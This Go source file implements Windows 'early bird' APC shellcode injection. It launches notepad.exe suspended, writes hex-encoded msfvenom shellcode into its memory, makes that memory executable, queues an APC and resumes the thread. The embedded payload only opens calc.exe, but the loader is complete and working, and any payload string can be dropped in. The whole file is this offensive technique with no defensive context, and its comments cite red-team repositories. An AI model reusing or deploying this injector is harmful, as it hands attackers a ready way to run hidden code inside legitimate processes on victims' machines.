package main

import (
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	CREATE_SUSPENDED  = 0x00000004
	MEM_COMMIT        = 0x00001000
	MEM_RESERVE       = 0x00002000
	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20
)

func main() {
	//References:
	//https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateProcess/main.go
	//https://github.com/sh4hin/GoPurple/blob/master/techniques/EBAPCQueue.go

	kernel32 := syscall.NewLazyDLL("Kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
	ResumeThread := kernel32.NewProc("ResumeThread")

	//msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f hex
	sc_hex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	//Convert shellcode to string
	sc, scErr := hex.DecodeString(sc_hex)
	if scErr != nil {
		fmt.Println("Error in SC")
	}

	/*BOOL CreateProcessA(
		LPCSTR                lpApplicationName,
		LPSTR                 lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL                  bInheritHandles,
		DWORD                 dwCreationFlags,
		LPVOID                lpEnvironment,
		LPCSTR                lpCurrentDirectory,
		LPSTARTUPINFOA        lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation
	  );*/

	//Create process in suspended state
	command := syscall.StringToUTF16Ptr("c:\\windows\\system32\\notepad.exe")
	startupInfo := new(syscall.StartupInfo)
	procInfo := new(syscall.ProcessInformation)
	errSyscall := syscall.CreateProcess(nil, command, nil, nil, false, CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errSyscall != nil {
		fmt.Println(errSyscall)
	}

	/*LPVOID VirtualAllocEx(
			 HANDLE hProcess,
	 		 LPVOID lpAddress,
	 		 SIZE_T dwSize,
	 		 DWORD  flAllocationType,
	 		 DWORD  flProtect
		);*/

	//Allocate Memory in suspended process
	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc Failed")
	} else {
		fmt.Println("Alloc: Success")
	}

	/*BOOL WriteProcessMemory(
	  		HANDLE  hProcess,
	  		LPVOID  lpBaseAddress,
	  		LPCVOID lpBuffer,
	  		SIZE_T  nSize,
	  		SIZE_T  *lpNumberOfBytesWritten
		);*/

	//write shellcode to allocated memory space
	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if errWriteMemory.Error() != "The operation completed successfully." {
		fmt.Println("WriteMemory: Failed")
	} else {
		fmt.Println("WriteMemory: Success")
	}

	/*BOOL VirtualProtectEx(
	  		HANDLE hProcess,
	  		LPVOID lpAddress,
	  		SIZE_T dwSize,
	  		DWORD  flNewProtect,
	  		PDWORD lpflOldProtect
		);*/

	//Reset permissions on shellcode to read/execute only
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect.Error() != "The operation completed successfully." {
		fmt.Println("VirtualProtect: Failed")
	} else {
		fmt.Println("VirtualProtect: Success")
	}

	/*DWORD QueueUserAPC(
	  		PAPCFUNC  pfnAPC,
	  		HANDLE    hThread,
	  		ULONG_PTR dwData
		);*/

	//Queue APC to shellcode thread
	_, _, errQueueUserAPC := QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if errQueueUserAPC.Error() != "The operation completed successfully." {
		fmt.Println("QueueUserAPC: Failed")
	} else {
		fmt.Println("QueueUserAPC: Success")
	}

	/*DWORD ResumeThread(
		HANDLE hThread
	  );*/

	//Resume Thread
	_, _, errResumeThread := ResumeThread.Call(uintptr(procInfo.Thread))
	if errResumeThread != nil {
		fmt.Println(errResumeThread)
	}
}
